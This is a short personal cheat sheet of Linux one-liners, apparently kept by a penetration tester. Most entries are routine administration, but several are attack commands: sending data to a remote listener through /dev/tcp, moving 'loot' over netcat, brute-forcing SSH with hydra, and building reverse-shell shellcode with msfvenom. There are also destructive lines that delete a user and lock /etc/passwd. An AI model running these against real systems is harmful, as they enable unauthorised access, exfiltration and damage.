 enumerate listening services
`netstat -tulnp`

 check for open files on a process
`lsof -p 1234`

 fast way to get local IP
`ip a | grep inet`

 dump routing table
`route -n`

send data to remote listener
`echo "payload" > /dev/tcp/10.10.10.5/4444`

 enumerate running processes cleanly
``ps aux --sort=-%mem | head``

 test file write with weird perms
`touch /tmp/testfile && echo test > /tmp/testfile`

transfer file via nc
`nc -lvp 1234 > loot.zip  # listener`
`nc target 1234 < loot.zip  # sender`

 brute-force SSH usernames (don’t ask)
`hydra -L users.txt -p '123456' ssh://10.10.10.5`

 generate quick shellcode (raw, no wrapper)
`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=1337 -f raw
`
 grep + awk magic to extract IPs from log
`cat access.log | grep -oP '(?<=client: )[\d\.]+' | sort -u`

deleted a user. no backup. nice.
`sudo userdel -r testuser`

 chattr locked this file and forgot why
`chattr +i /etc/passwd`

 hostname was weird, saved it for later
`hostname >> ~/weird_hostnames.txt`

